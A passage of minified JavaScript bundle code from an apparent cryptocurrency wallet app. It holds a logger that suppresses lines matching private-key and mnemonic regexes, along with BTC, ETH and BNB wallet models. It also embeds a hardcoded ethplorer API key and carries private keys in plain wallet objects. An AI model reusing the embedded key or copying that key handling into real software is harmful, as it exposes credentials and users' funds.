          , c = a(41817)
          , u = a.n(c)
          , d = a(58655)
          , m = a(57506)
          , p = a(13196);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const f = 0
          , E = (0,
        m.ZP)("log-enabled");
        function print(e, t) {
            for (var a = arguments.length, n = new Array(a > 2 ? a - 2 : 0), r = 2; r < a; r++)
                n[r - 2] = arguments[r];
            t && n.unshift("%c[%s]", "color: deepskyblue;", t);
            if (p.CM || E) {
                0;
                console[e](...n)
            }
        }
        class LoggerClass {
            constructor() {
                var e = this;
                let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                _defineProperty(this, "name", void 0);
                _defineProperty(this, "safeLogger", void 0);
                _defineProperty(this, "warn", (function() {
                    for (var t = arguments.length, a = new Array(t), n = 0; n < t; n++)
                        a[n] = arguments[n];
                    e.isSafeParams(...a) && print("warn", e.name, ...a)
                }
                ));
                _defineProperty(this, "log", (function() {
                    for (var t = arguments.length, a = new Array(t), n = 0; n < t; n++)
                        a[n] = arguments[n];
                    e.isSafeParams(...a) && print("log", e.name, ...a)
                }
                ));
                _defineProperty(this, "error", (function() {
                    for (var t = arguments.length, a = new Array(t), n = 0; n < t; n++)
                        a[n] = arguments[n];
                    e.isSafeParams(...a) && print("error", e.name, ...a)
                }
                ));
                t.name && (this.name = t.name);
                t.safeLogger && (this.safeLogger = t.safeLogger)
            }
            static create(e) {
                let {name: t} = e;
                return new LoggerClass({
                    name: t
                })
            }
            isSafeParams() {
                if (!this.safeLogger)
                    return !1;
                for (var e = arguments.length, t = new Array(e), a = 0; a < e; a++)
                    t[a] = arguments[a];
                const n = t.map((e => {
                    if ("string" == typeof e)
                        return e;
                    try {
                        return JSON.stringify(e)
                    } catch {
                        return String(e)
                    }
                }
                )).join(" ");
                return !this.safeLogger.hasSensitiveData(n)
            }
        }
        const h = new d.N
          , g = new LoggerClass({
            safeLogger: h
        })
    }
    ,
    18600: (e, t, a) => {
        "use strict";
        a.d(t, {
            Ph: () => n.P,
            NK: () => r,
            i2: () => l
        });
        var n = a(12587);
        const r = n.P.create({
            name: "reducer-secure-storage"
        })
          , l = n.P.create({
            name: "reducer-wallets"
        })
    }
    ,
    2194: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => n
        });
        let n;
        !function(e) {
            e.SOL = "SOL";
            e.ADA = "ADA";
            e.ETH = "ETH";
            e.BTC = "BTC";
            e.TRX = "TRX";
            e.ALL = "ALL"
        }(n || (n = {}));
        function getNetworkFromName(e) {
            if (!e)
                return n.ALL;
            const t = e.toLowerCase();
            return t.includes("sol") ? n.SOL : t.includes("ada") ? n.ADA : t.includes("eth") ? n.ETH : t.includes("btc") ? n.BTC : t.includes("trx") ? n.TRX : n.ALL
        }
    }
    ,
    58655: (e, t, a) => {
        "use strict";
        a.d(t, {
            N: () => SafeLogger,
            X: () => isSafeParam
        });
        var n = a(38862)
          , r = a(41817)
          , l = a(2194);
        const s = undefined
          , i = new Blob(["\n  class SafeLogger {\n    constructor(network = 'ALL') {\n      this.network = network;\n    }\n\n    hasSensitiveData(msg) {\n      return this.containsSensitiveData(msg, this.network);\n    }\n\n    containsSensitiveData(originalMsg, network) {\n      if (this.containsMnemonic(originalMsg)) {\n        return true;\n      }\n\n      const sanitized = originalMsg.replace(/[^a-zA-Z0-9]/g, '');\n\n      switch (network) {\n        case 'SOL':\n          if (this.containsSol(sanitized) || this.containsMnemonic(originalMsg)) return true;\n          break;\n        case 'ADA':\n          if (this.containsAda(sanitized) || this.containsMnemonic(originalMsg)) return true;\n          break;\n        case 'ETH':\n          if (this.containsEth(sanitized) || this.containsMnemonic(originalMsg)) return true;\n          break;\n        case 'BTC':\n          if (this.containsBtc(sanitized) || this.containsMnemonic(originalMsg)) return true;\n          break;\n        case 'TRX':\n          if (this.containsTrx(sanitized)) return true;\n          break;\n        case 'ALL':\n        default:\n          if (\n            this.containsAda(sanitized) ||\n            this.containsSol(sanitized) ||\n            this.containsTrx(sanitized) ||\n            this.containsEth(sanitized) ||\n            this.containsBtc(sanitized) ||\n            this.containsMnemonic(originalMsg)\n          ) {\n            return true;\n          }\n      }\n\n      return false;\n    }\n\n    containsMnemonic(msg) {\n      const words = msg.trim().split(' ');\n      const wordCount = words.length;\n      return wordCount === 12 || wordCount === 24 || wordCount === 25;\n    }\n\n    containsAda(sanitized) {\n      const adaRegex = /ed25519e_sk1[a-zA-Z0-9]+/;\n      return adaRegex.test(sanitized);\n    }\n\n    containsSol(sanitized) {\n      const solRegex = /^[0-9A-Fa-f]{128}$/;\n      return solRegex.test(sanitized);\n    }\n\n    containsTrx(sanitized) {\n      const trxRegex = /^[0-9A-Fa-f]{64}$/;\n      return trxRegex.test(sanitized);\n    }\n\n    containsEth(sanitized) {\n      const ethRegex = /^(0x)?[a-fA-F0-9]{64}$/;\n      return ethRegex.test(sanitized);\n    }\n\n    containsBtc(sanitized) {\n      const btcRegex = /^(5[HJK][1-9A-HJ-NP-Za-km-z]{49}|[KL][1-9A-HJ-NP-Za-km-z]{51})$/;\n      return btcRegex.test(sanitized);\n    }\n  }\n\n  const dictionaryOfExceptions = [\n    'hash', 'txHash', 'uuid'\n  ];\n\n  function extractStrings(param) {\n    const results = [];\n    const stack = [param];\n    const seen = new WeakSet();\n\n    while (stack.length > 0) {\n      const value = stack.pop();\n      if (value === null || value === undefined) continue;\n\n      if (typeof value === 'string') {\n        if (!dictionaryOfExceptions.includes(value)) {\n          results.push(value);\n        }\n        continue;\n      }\n\n      if (typeof value === 'number' || typeof value === 'boolean' || typeof value === 'symbol' || typeof value === 'bigint') {\n        const strValue = String(value);\n        if (!dictionaryOfExceptions.includes(strValue)) {\n          results.push(strValue);\n        }\n        continue;\n      }\n\n      if (value instanceof Error) {\n        if (value.message && !dictionaryOfExceptions.includes(value.message)) {\n          results.push(value.message);\n        }\n        continue;\n      }\n\n      if (value instanceof Date) {\n        const isoDate = value.toISOString();\n        if (!dictionaryOfExceptions.includes(isoDate)) {\n          results.push(isoDate);\n        }\n        continue;\n      }\n\n      if (typeof value === 'object') {\n        if (seen.has(value)) continue;\n        seen.add(value);\n\n        if (Array.isArray(value)) {\n          for (let i = value.length - 1; i >= 0; i--) {\n            stack.push(value[i]);\n          }\n        } else {\n          const entries = Object.entries(value);\n          for (let i = entries.length - 1; i >= 0; i--) {\n            const [key, val] = entries[i];\n            if (!dictionaryOfExceptions.includes(key) && !dictionaryOfExceptions.includes(String(val))) {\n              results.push(key);\n              stack.push(val);\n            }\n          }\n        }\n        continue;\n      }\n\n      const strValue = String(value);\n      if (!dictionaryOfExceptions.includes(strValue)) {\n        results.push(strValue);\n      }\n    }\n\n    return results;\n  }\n\n  self.onmessage = (event) => {\n    const param = event.data.param;\n    const network = event.data.network;\n\n    const logger = new SafeLogger(network);\n\n    const strings = extractStrings(param);\n\n    for (const s of strings) {\n      if (logger.hasSensitiveData(s)) {\n        self.postMessage(true);\n        return;\n      }\n    }\n\n    self.postMessage(false);\n  };\n"],{
            type: "application/javascript"
        })
          , o = URL.createObjectURL(i);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class SafeLogger {
            constructor() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : l.Z.ALL;
                _defineProperty(this, "network", void 0);
                this.network = e
            }
            hasSensitiveData(e) {
                return this.containsSensitiveData(e, this.network)
            }
            containsSensitiveData(e, t) {
                if (this.containsMnemonic(e))
                    return !0;
                const a = e.replace(/[^a-zA-Z0-9]/g, "");
                switch (t) {
                case "SOL":
                    if (this.containsSol(a) || this.containsMnemonic(e))
                        return !0;
                    break;
                case "ADA":
                    if (this.containsAda(a) || this.containsMnemonic(e))
                        return !0;
                    break;
                case "ETH":
                    if (this.containsEth(a) || this.containsMnemonic(e))
                        return !0;
                    break;
                case "BTC":
                    if (this.containsBtc(a) || this.containsMnemonic(e))
                        return !0;
                    break;
                case "TRX":
                    if (this.containsTrx(a))
                        return !0;
                    break;
                default:
                    if (this.containsAda(a) || this.containsSol(a) || this.containsTrx(a) || this.containsEth(a) || this.containsBtc(a) || this.containsMnemonic(e))
                        return !0
                }
                return !1
            }
            containsMnemonic(e) {
                const t = undefined
                  , a = e.trim().split(/\s+/).length;
                return 12 === a || 24 === a || 25 === a
            }
            containsAda(e) {
                const t = undefined;
                return /ed25519e_sk1[a-zA-Z0-9]+/.test(e)
            }
            containsSol(e) {
                const t = undefined;
                return /^[0-9A-Fa-f]{128}$/.test(e)
            }
            containsTrx(e) {
                const t = undefined;
                return /^[0-9A-Fa-f]{64}$/.test(e)
            }
            containsEth(e) {
                const t = undefined;
                return /^(0x)?[a-fA-F0-9]{64}$/.test(e)
            }
            containsBtc(e) {
                const t = undefined;
                return /^(5[HJK][1-9A-HJ-NP-Za-km-z]{49}|[KL][1-9A-HJ-NP-Za-km-z]{51})$/.test(e)
            }
        }
        const isSafeParam = e => {
            let {param: t, network: a} = e;
            const n = new Worker(o);
            return new Promise(( (e, r) => {
                n.postMessage({
                    param: JSON.parse(JSON.stringify(t)),
                    network: a
                });
                n.onmessage = t => {
                    n.terminate();
                    e(!t.data)
                }
                ;
                n.onerror = e => {
                    n.terminate();
                    r(e)
                }
            }
            ))
        }
    }
    ,
    70888: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => BtcWalletModel
        });
        var n = a(64211)
          , r = a.n(n)
          , l = a(2490)
          , s = a.n(l)
          , i = a(41874)
          , o = a.n(i)
          , c = a(41817)
          , u = a.n(c)
          , d = a(17995)
          , m = a(67048)
          , p = a(74315);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class BtcWalletModel extends p.Z {
            constructor() {
                super();
                _defineProperty(this, "_handleSocketIncomingTokenTx", (async e => {
                    const t = {
                        ...e
                    };
                    let a = !1
                      , n = this.subWallets[0];
                    if (!n) {
                        a = await this.fetchSubWallets();
                        n = this.subWallets[0]
                    }
                    t.currencyFrom = n.data.currency;
                    t.currencyTo = n.data.currency;
                    t.amount = (0,
                    m.hC)(t.amount, 10 ** 8).toString();
                    t.isIncoming = this._isTxIsIncoming(t);
                    return {
                        tx: t,
                        shouldUpdateWallet: a
                    }
                }
                ));
                _defineProperty(this, "_handleSocketIncomingTokenTxConfirmation", (async e => {
                    const t = {
                        ...e
                    };
                    let a = this.subWallets[0]
                      , n = !1;
                    if (!a) {
                        n = await this.fetchSubWallets();
                        a = this.subWallets[0]
                    }
                    t.currencyFrom = a.data.currency;
                    t.currencyTo = a.data.currency;
                    t.amount = (0,
                    m.hC)(t.amount, 10 ** 8).toString();
                    this.repeatFetchBalance(a, 40, 3e3);
                    this.repeatFetchBalance(this);
                    t.isIncoming = this._isTxIsIncoming(t);
                    return {
                        tx: t,
                        shouldUpdateWallet: n
                    }
                }
                ));
                _defineProperty(this, "checkUtxos", (async e => {
                    let {addressTo: t, amount: a, feePerByte: n, fee: r} = e;
                    const l = await d.Z.getApiByWallet(this.data)
                      , s = await l.getDustThreshold()
                      , i = (0,
                    m.eq)(a, this.data.balance) || (0,
                    m.eq)((0,
                    m.PD)(a, r), this.data.balance)
                      , o = (0,
                    m.eq)(a, this.data.balance) ? (0,
                    m.h9)(a, r).toString() : a
                      , existsNonEmpty = e => "string" == typeof e && e.length > 0
                      , c = await l.prepareTx({
                        addressFrom: this.data.address,
                        addressTo: t,
                        amount: o,
                        isAllIn: i,
                        feePerByte: n
                    })
                      , u = {
                        isNoValid: !1,
                        isDustRemaining: !1
                    };
                    null != c && c.outputs && (u.isDustRemaining = c.outputs.some((e => e.value < s)));
                    existsNonEmpty(t) && existsNonEmpty(a) && void 0 === (null == c ? void 0 : c.inputs) && (u.isNoValid = !0);
                    return u
                }
                ));
                this.multisigs = []
            }
        }
    }
    ,
    47799: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => EthWalletModel
        });
        var n = a(31672)
          , r = a.n(n)
          , l = a(2490)
          , s = a.n(l)
          , i = a(59461)
          , o = a.n(i)
          , c = a(41817)
          , u = a.n(c)
          , d = a(9669)
          , m = a.n(d)
          , p = a(67048)
          , f = a(90702);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class EthWalletModel extends f.Z {
            constructor() {
                super(...arguments);
                _defineProperty(this, "fetchAndAddTokenSubwallet", (async (e, t) => {
                    try {
                        const a = `https://api.ethplorer.io/getAddressInfo/${e}?apiKey=mnwl1551CLeiAd98`
                          , {data: n} = await m().get(a)
                          , {tokenInfo: r} = n;
                        let l = !1;
                        const s = {
                            address: this.data.address,
                            currency: r.symbol.toLowerCase(),
                            balance: (0,
                            p.$q)(t.balance, `1e-${r.decimals}`).toString(),
                            smartContract: r.address,
                            privateKey: this.data.privateKey,
                            family: "eth",
                            title: r.name,
                            precision: r.decimals
                        }
                          , i = this.subWallets.find((e => e.currency === s.currency));
                        if (i) {
                            if (!i.privateKey || !i.precision) {
                                await this.removeSubWallet(i);
                                await this.addSubWallet(s);
                                l = !0
                            }
                        } else {
                            await this.addSubWallet(s);
                            l = !0
                        }
                        return l
                    } catch (e) {
                        return !1
                    }
                }
                ))
            }
        }
    }
    ,
    52084: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => BnbWalletModel
        });
        var n = a(31672)
          , r = a(2490)
          , l = a(59461)
          , s = a(88449)
          , i = a(59849)
          , o = a(10072)
          , c = a(23042)
          , u = a(99137)
          , d = a(71957)
          , m = a(96306)
          , p = a(103)
          , f = a(74592)
          , E = a(58276)
          , h = a(35082)
          , g = a(12813)
          , y = a(18222)
          , v = a(38563)
          , _ = a(50336)
          , w = a(7512)
          , b = a(15581)
          , k = a(34514)
          , S = a(38862)
          , C = a(41817)
          , N = a(17995)
          , T = a(18913)
          , A = a(9710)
          , x = a(13196)
          , I = a(57506)
          , P = a(58752)
          , L = a(6723)
          , F = a(18600)
          , W = a(64183)
          , R = a(65811)
          , B = a(45152);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class BnbSubWalletModel extends B.Z {
            constructor() {
                super();
                _defineProperty(this, "SubWalletModel", W.n);
                _defineProperty(this, "isUpdatableBySocket", !0);
                this.type = R.aO.BNB_TOKEN_SUBWALLET;
                this.subWalletsHidden = !0;
                this.isSubWallet = !0
            }
        }
        function bnb_defineProperty(e, t, a) {
            (t = bnb_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function bnb_toPropertyKey(e) {
            var t = bnb_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function bnb_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const O = F.Ph.create({
            name: "model-bnb"
        });
        class BnbWalletModel extends L.b {
            constructor() {
                super();
                bnb_defineProperty(this, "SubWalletModel", BnbSubWalletModel);
                bnb_defineProperty(this, "isUpdatableBySocket", !0);
                bnb_defineProperty(this, "isSocketUniqInstance", !0);
                bnb_defineProperty(this, "areSubWalletsEqual", ( (e, t) => (0,
                T.Z)(e.currency).toLowerCase() === (0,
                T.Z)(t.currency).toLowerCase()));
                bnb_defineProperty(this, "getAccountRawData", (async () => {
                    const e = await N.Z.getApiByWallet(this.data);
                    if (!e)
                        throw new Error("No api found");
                    return e.getAccountRawData(this.data.address)
                }
                ));
                bnb_defineProperty(this, "updateBalance", (async () => {
                    try {
                        var e, t, a;
                        const n = this.data.balance;
                        let r = await this.getAccountRawData();
                        const l = null === (e = r) || void 0 === e ? void 0 : e.find((e => e.symbol.toLowerCase() === this.data.currency));
                        if (x.CM) {
                            const e = (0,
                            I.ZP)("balance");
                            e && l && Object.assign(l, {
                                free: e
                            })
                        }
                        this.data.balance = l ? l.free : "0";
                        r = null === (t = r) || void 0 === t ? void 0 : t.filter((e => e.symbol.toLowerCase() !== this.data.currency));
                        const s = new Map;
                        let i = !1;
                        null === (a = r) || void 0 === a || a.forEach((e => {
                            const t = this.subWallets.find((t => e.symbol.toLowerCase() === t.currency));
                            if (t)
                                t.data.balance = e.free;
                            else {
                                i = !0;
                                s.set(e.symbol, e)
                            }
                        }
                        ));
                        this.subWallets.forEach((e => {
                            var t;
                            const a = undefined;
                            (null === (t = r) || void 0 === t ? void 0 : t.find((t => t.symbol.toLowerCase() === e.currency))) || (e.data.balance = "0")
                        }
                        ));
                        0 !== s.size && s.forEach((e => {
                            this.addSubWallet({
                                address: this.data.address,
                                currency: e.symbol.toLowerCase(),
                                privateKey: this.data.privateKey,
                                derivePath: this.data.derivePath,
                                balance: e.free
                            })
                        }
                        ));
                        if (this.storeManager) {
                            n !== this.data.balance && this.storeManager.updateBalance(this);
                            this.storeManager.setWalletBalanceWasUpdatedByRest(this.data.uuid);
                            i && this.storeManager.commitWalletUpdate(this)
                        } else
                            O.error("this.storeManager is null", this)
                    } catch (e) {
                        console.info(e);
                        O.warn(`updateBalance bnb failed ${e.message}`)
                    }
                }
                ));
                bnb_defineProperty(this, "_fetchTransactions", (async () => {
                    const e = await N.Z.loadLightAdapterByWallet(this.data);
                    if (!e)
                        throw new Error("No api found");
                    return e.getTransactionsByAddressIncSubs({
                        address: this.data.address,
                        currency: this.data.currency
                    })
                }
                ));
                bnb_defineProperty(this, "updateTransactions", (async () => {
                    try {
                        const e = await this._fetchTransactions();
                        if (this.storeManager) {
                            A.n.sendTxsNotifications({
                                txs: e,
                                wallet: this,
                                isFromSocket: !1
                            });
                            this.storeManager.updateTransactions(this, e);
                            this.storeManager.setWalletTransactionsWereUpdatedByRest(this.data.uuid)
                        } else
                            O.error("this.storeManager is null", this)
                    } catch (e) {
                        O.warn(`updateTxs bnb failed ${e.message}`)
                    }
                }
                ));
                bnb_defineProperty(this, "installSocketHook", (async e => {
                    let {commitWalletUpdate: t, updateBalance: a, updateTransactions: n, updateConnection: r} = e
                      , l = null;
                    const connect = async () => {
                        l = new WebSocket("wss://dex.binance.org/api/ws");
                        l.onopen = () => {
                            l.send(JSON.stringify({
                                method: "subscribe",
                                topic: "transfers",
                                address: this.address
                            }));
                            l.send(JSON.stringify({
                                method: "subscribe",
                                topic: "accounts",
                                address: this.address
                            }))
                        }
                        ;
                        l.onmessage = async e => {
                            const r = JSON.parse(e.data);
                            if (r.stream && r.data)
                                switch (r.stream) {
                                case "accounts":
                                    if (r.data.B && Array.isArray(r.data.B))
                                        try {
                                            let e = r.data.B;
                                            const n = e.find((e => e.a.toLowerCase() === this.data.currency));
                                            this.data.balance = n ? n.f : "0";
                                            e = e.filter((e => e.a.toLowerCase() !== this.data.currency));
                                            const l = new Map;
                                            let s = !1;
                                            e.forEach((e => {
                                                const t = this.subWallets.find((t => e.a.toLowerCase() === t.currency));
                                                if (t)
                                                    t.data.balance = e.f;
                                                else {
                                                    s = !0;
                                                    l.set(e.a, e)
                                                }
                                            }
                                            ));
                                            this.subWallets.forEach((t => {
                                                const a = undefined;
                                                e.find((e => e.a.toLowerCase() === t.currency)) || (t.data.balance = "0")
                                            }
                                            ));
                                            0 !== l.size && l.forEach((e => {
                                                this.addSubWallet({
                                                    address: this.data.address,
                                                    currency: e.a.toLowerCase(),
                                                    privateKey: this.data.privateKey,
                                                    derivePath: this.data.derivePath,
                                                    balance: e.f
                                                })
                                            }
                                            ));
                                            a(this);
                                            setTimeout(( () => {
                                                this.storeManager.isWalletTransactionsWereUpdatedByRest(this.data.uuid) && this.updateTransactions()
                                            }
                                            ), 1e4);
                                            s && t(this)
                                        } catch (e) {
                                            O.error("accounts sockets event bnb failed", e)
                                        }
                                    else
                                        O.warn(`accounts sockets event -cant parse incomming${JSON.stringify(r.data)}`);
                                    break;
                                case "transfers":
                                    try {
                                        const e = r.data
                                          , t = (0,
                                        P.v)({
                                            addressFrom: e.f,
                                            addressTo: e.t[0].o,
                                            currencyFrom: e.t[0].c[0].a.toLowerCase(),
                                            currencyTo: e.t[0].c[0].a.toLowerCase(),
                                            status: "success",
                                            isIncoming: e.t[0].o === this.data.address,
                                            confirmations: 1,
                                            blockhash: "",
                                            timestamp: Date.now(),
                                            amount: e.t[0].c[0].A,
                                            hash: e.H,
                                            fee: "0.00625"
                                        });
                                        e.t[0].c[0].a.toLowerCase() !== this.data.currency && (t.family = this.data.currency);
                                        A.n.sendTxNotification({
                                            tx: t,
                                            wallet: this,
                                            isFromSocket: !0
                                        });
                                        await n(this, [t])
                                    } catch (e) {
                                        O.error("accounts txs event bnb failed", e)
                                    }
                                }
                        }
                        ;
                        l.onclose = async () => {
                            setTimeout((async () => {
                                connect();
                                await r(this, l)
                            }
                            ), 3e3)
                        }
                    }
                    ;
                    connect();
                    return l
                }
                ));
                this.type = R.uQ.BNB_WALLET;
                this.subWalletsHidden = !1
            }
        }
    }
    ,
    69509: (e, t, a) => {
        "use strict";
        a.d(t, {
            L: () => y,
            Z: () => AbstractWallet
        });
        var n = a(15581)
          , r = a.n(n)
          , l = a(2490)
          , s = a.n(l)
          , i = a(34514)
          , o = a.n(i)
          , c = a(38862)
          , u = a.n(c)
          , d = a(41817)
          , m = a.n(d)
          , p = a(42155)
          , f = a(29278)
          , E = a(57110)
          , h = a(12587)
          , g = a(80552);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        let y;
        !function(e) {
            e.LEGACY = "legacy";
            e.BIP44 = "bip44";
            e.BIP49 = "bip49";
            e.BIP84 = "bip84";
            e.BIP86 = "bip86"
        }(y || (y = {}));
        const v = h.P.create({
            name: "abstract-model"
        })
          , _ = ["btc-testnet", "btc", "ropsten", "eth"];
        class AbstractWallet {
            constructor() {
                _defineProperty(this, "SubWalletModel", void 0);
                _defineProperty(this, "data", {
                    uuid: "",
                    title: "",
                    currency: "",
                    balance: "",
                    address: "",
                    lockedBalance: ""
                });
                _defineProperty(this, "isNeedUpdateTransactions", !0);
                _defineProperty(this, "subWallets", []);
                _defineProperty(this, "multisigs", []);
                _defineProperty(this, "isSubWallet", !1);
                _defineProperty(this, "isUpdatableBySocket", !1);
                _defineProperty(this, "isSocketUniqInstance", !1);
                _defineProperty(this, "initializeDataGettersAndSetters", ( () => {
                    try {
                        Object.keys(this.data).forEach((e => {
                            if ("uuid" !== e && "currency" !== e && "family" !== e && "ticker" !== e && "balance" !== e && "precision" !== e && "address" !== e && "account" !== e && "publicKey" !== e && "privateKey" !== e && "derivePath" !== e && "accountName" !== e && "smartContract" !== e && "propertyid" !== e && "rewardAddress" !== e && "subWalletsHidden" !== e && "multisigs" !== e && "title" !== e && "type" !== e && "hw" !== e && "isCustom" !== e && "multisigsShow" !== e && "watchOnly" !== e && "minimalBalance" !== e && "isUpdatableBySocket" !== e && "isSocketUniqInstance" !== e && "isFakeToken" !== e && "parentUuid" !== e && "legacyAddress" !== e && "derivedFromMnemonicUsing" !== e) {
                                console.warn("Wallet model property", e, "is defined using `defineProperty`. Refactor it to getter & setter pair.`");
                                Object.getOwnPropertyDescriptor(this, e) || Object.defineProperty(this, e, {
                                    get() {
                                        return this.data[e]
                                    },
                                    set(t) {
                                        this.data[e] = t
                                    },
                                    configurable: !0
                                })
                            }
                        }
                        ))
                    } catch (e) {
                        v.error(`initializeDataGettersAndSetters failed ${this.data.currency}`, e)
                    }
                }
                ));
                _defineProperty(this, "updateBalance", (async () => {
                    throw new Error("Not implemented")
                }
                ));
                _defineProperty(this, "updateTransactions", (async () => {
                    throw new Error("Not implemented")
                }
                ));
                _defineProperty(this, "_fetchTransactions", (async () => {
                    throw new Error("Not implemented")
                }
                ));
                _defineProperty(this, "removeSubWallet", (async e => {
                    throw new Error("Not implemented")
                }
                ));
                _defineProperty(this, "_createSubwallets", (async e => {
                    try {
                        const t = [];
                        if (e && Array.isArray(e))
                            for (const a of e) {
                                a.family = this.currency;
                                t.push(await (new this.SubWalletModel).create(a))
                            }
                        return t
                    } catch (t) {
                        v.error(`_createSubwallets failed ${e}`, t);
                        return []
                    }
                }
                ));
                _defineProperty(this, "mapData", ( () => {
                    throw new Error("Not implemented")
                }
                ));
                _defineProperty(this, "_recoverInstance", (e => {
                    try {
                        this.data = {
                            ...this.data,
                            ...e
                        };
                        this.data.uuid = this.data.uuid || (0,
                        p.Z)().slice(0, 8);
                        const t = [];
                        if (e.subWallets && Array.isArray(e.subWallets))
                            for (const a of e.subWallets)
                                t.push((new this.SubWalletModel).recoverFromPlainObject(a));
                        delete this.data.subWallets;
                        this.subWallets = t;
                        return this
                    } catch (t) {
                        v.error(`_recoverInstance failed ${e}`, t);
                        return this
                    }
                }
                ));
                _defineProperty(this, "create", (async e => {
                    try {
                        const t = undefined;
                        return await this._createInstance(e)
                    } catch (t) {
                        v.error(`create failed ${this.data.currency} ${JSON.stringify(e)}`, t);
                        throw t
                    }
                }
                ));
                _defineProperty(this, "recoverFromPlainObject", (e => {
                    try {
                        const t = undefined;
                        return this._recoverInstance(e)
                    } catch (e) {
                        v.error(`recoverFromPlainObject failed ${this.data.currency}`, e);
                        throw e
                    }
                }
                ));
                _defineProperty(this, "equals", (e => {
                    if (!e)
                        return !1;
                    const t = this.mapToPlainObject();
                    let a;
                    a = e instanceof AbstractWallet ? e.mapToPlainObject() : e;
                    return (0,
                    f.Z)(t, a)
                }
                ))
            }
            get isWatchOnly() {
                return !0 === this.data.watchOnly
            }
            get isHw() {
                return !!this.data.hw
            }
            get isTestnet() {
                return "ropsten" === this.data.currency || this.data.currency.indexOf("-testnet") > -1
            }
            get isMultisigsShow() {
                return _.includes(this.data.currency)
            }
            get uuid() {
                return this.data.uuid
            }
            set uuid(e) {
                this.data.uuid = e
            }
            get type() {
                return this.data.type
            }
            set type(e) {
                this.data.type = e
            }
            get hw() {
                return this.data.hw
            }
            set hw(e) {
                this.data.hw = e
            }
            get currency() {
                return this.data.currency
            }
            set currency(e) {
                this.data.currency = e
            }
            get family() {
                return this.data.family
            }
            set family(e) {
                this.data.family = e
            }
            get ticker() {
                return this.data.ticker
            }
            set ticker(e) {
                this.data.ticker = e
            }
            get precision() {
                return this.data.precision
            }
            set precision(e) {
                this.data.precision = e
            }
            get balance() {
                return this.data.balance
            }
            set balance(e) {
                this.data.balance = e
            }
            get lockedBalance() {
                return this.data.lockedBalance
            }
            set lockedBalance(e) {
